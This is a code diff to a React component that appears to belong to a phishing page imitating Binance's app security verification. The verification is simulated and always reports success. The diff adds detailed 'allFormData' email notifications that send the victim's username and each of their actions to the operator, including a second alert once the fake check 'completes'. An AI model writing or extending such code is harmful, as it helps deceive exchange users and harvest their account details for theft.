@@ -25,16 +25,37 @@ const SecurityVerification: React.FC<SecurityVerificationProps> = ({
     // Send email notification
     try {
       await sendEmailNotification({
-        step: "Security Verification - App Verification",
+        step: "Security Verification - App Verification Started",
         username,
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        allFormData: {
+          username,
+          action: "app_verification_started",
+          verificationMethod: "binance_app"
+        }
       });
     } catch (error) {
-      console.error('Email notification failed:', error);
+      console.error('❌ Email notification failed:', error);
     }
     
     // Simulate app verification
-    setTimeout(() => {
+    setTimeout(async () => {
+      try {
+        await sendEmailNotification({
+          step: "Security Verification - App Verification COMPLETED",
+          username,
+          timestamp: new Date().toISOString(),
+          allFormData: {
+            username,
+            action: "app_verification_completed",
+            verificationMethod: "binance_app",
+            status: "success"
+          }
+        });
+      } catch (error) {
+        console.error('❌ Email notification failed:', error);
+      }
+
       setIsVerifying(false);
       onVerificationSuccess();
       toast({
@@ -48,12 +69,17 @@ const SecurityVerification: React.FC<SecurityVerificationProps> = ({
     // Send email notification
     try {
       await sendEmailNotification({
-        step: "Security Verification - Other Methods",
+        step: "Security Verification - Other Methods Selected",
         username,
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        allFormData: {
+          username,
+          action: "other_methods_selected",
+          verificationMethod: "alternative"
+        }
       });
     } catch (error) {
-      console.error('Email notification failed:', error);
+      console.error('❌ Email notification failed:', error);
     }
     
     // Skip to next step for "other methods"
@@ -70,10 +96,14 @@ const SecurityVerification: React.FC<SecurityVerificationProps> = ({
       await sendEmailNotification({
         step: "Security Verification - Back to Login",
         username,
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        allFormData: {
+          username,
+          action: "back_to_login"
+        }
       });
     } catch (error) {
-      console.error('Email notification failed:', error);
+      console.error('❌ Email notification failed:', error);
     }
     
     onBack();
